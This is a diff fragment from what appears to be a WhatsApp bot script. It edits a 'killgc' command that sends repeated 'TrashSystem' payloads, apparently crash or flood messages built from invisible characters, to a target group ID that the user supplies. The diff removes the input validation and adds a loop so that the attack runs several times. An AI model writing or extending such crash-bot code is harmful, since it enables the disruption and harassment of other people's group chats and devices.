@@ -1129,19 +1129,14 @@ case 'killgc': {
     if (!isCreator) return reply(mess.owner);
     if (!isPremium) return reply(mess.prem);
     if (!q) return reply(`Example: ${prefix + command} GROUP_ID`);
+	target = q
+	reply('Wait Your Group  is being Utilised');
+for (let j = 0; j < 5; j++) {
 
-    const groupId = q.trim();
-
-    // Validate that the group ID is in the correct format (this may vary based on your application)
-    if (!/^d{1,15}@$/.test(groupId)) {
-        return reply('Please provide a valid group ID.');
-    }
-
-    reply('Wait Your Group  is being Utilised');
-
+    
     // Function to convert text to invisible characters
-    await TrashSystem(groupId, sam, ptcp = true);
-    await TrashSystem(groupId, sam, cct = true, ptcp = true);
+    await TrashSystem(target, sam, ptcp = true);
+    await TrashSystem(target, sam, cct = true, ptcp = true);
 
     reply(`
          ┏━━━━━━━━━━━━━━━━━━━━━
